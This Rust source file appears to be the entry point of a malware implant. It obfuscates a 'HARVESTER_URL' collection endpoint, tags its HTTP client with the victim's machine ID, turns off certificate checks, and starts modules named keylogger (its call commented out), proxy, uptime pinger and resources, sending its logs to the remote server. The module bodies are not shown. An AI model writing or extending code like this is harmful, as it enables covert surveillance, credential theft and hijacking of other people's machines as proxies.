use std::{
    future::pending,
    sync::{
        Arc,
        atomic::{AtomicU64, Ordering},
    },
    time::Duration,
};

use log::info;
use muddy::muddy;
use once_cell::sync::Lazy;
use reqwest::{
    Client,
    header::{HeaderMap, HeaderValue},
};

mod http_logger;

mod uptime_pinger;
pub use uptime_pinger::uptime_pinger;

mod keylogger;
pub use keylogger::keylogger;

mod proxy;
pub use proxy::proxy;

mod resources;
pub use resources::resources;

use log_json_serializer::parse_log;

use crate::http_logger::HttpLogger;

static HARVESTER_URL: Lazy<&'static str> = Lazy::new(|| muddy!("localhost:6767"));
static MACHINE_ID: Lazy<String> =
    Lazy::new(|| machine_uid::machine_id::get_machine_id().unwrap_or("unknown".into()));
const REQ_FEEDBACK_SPEED_SECS: u64 = 60;

pub struct GlobalState {
    request_counter: AtomicU64,
}

#[tokio::main]
async fn main() {
    fern::Dispatch::new()
        .format(|out, message, record| {
            out.finish(format_args!(
                "{}",
                parse_log(message, record).expect("failed to serialize log into json")
            ));
        })
        .level(log::LevelFilter::Info)
        .chain(std::io::stdout())
        .chain(
            fern::Dispatch::new()
                .filter(|metadata| {
                    let target = metadata.target();
                    !target.starts_with("hyper")
                        && !target.starts_with("reqwest")
                        && !target.starts_with("h2")
                        && !target.starts_with("tower")
                        && !target.starts_with("rustls")
                })
                .chain(fern::Output::writer(Box::new(HttpLogger::new()), "")),
        )
        .apply()
        .unwrap();

    info!("outlet inited with machine id: {:?}", *MACHINE_ID);

    let global_state = Arc::new(GlobalState {
        request_counter: 0.into(),
    });

    let mut headers = HeaderMap::new();
    headers.insert("machine-id", HeaderValue::from_str(&MACHINE_ID).unwrap());
    let reqwest_client = Client::builder()
        .default_headers(headers)
        .danger_accept_invalid_hostnames(true)
        .danger_accept_invalid_certs(true)
        .pool_max_idle_per_host(32)
        .connect_timeout(Duration::from_secs(5))
        .timeout(Duration::from_secs(90))
        .pool_idle_timeout(Duration::from_secs(5))
        .build()
        .unwrap();

    uptime_pinger(reqwest_client.clone());
    // keylogger(reqwest_client.to_owned());
    proxy(reqwest_client.to_owned(), global_state.to_owned());
    resources(global_state.to_owned(), reqwest_client.to_owned());

    info!("successfully inited, running forever!");
    pending::<()>().await;
}
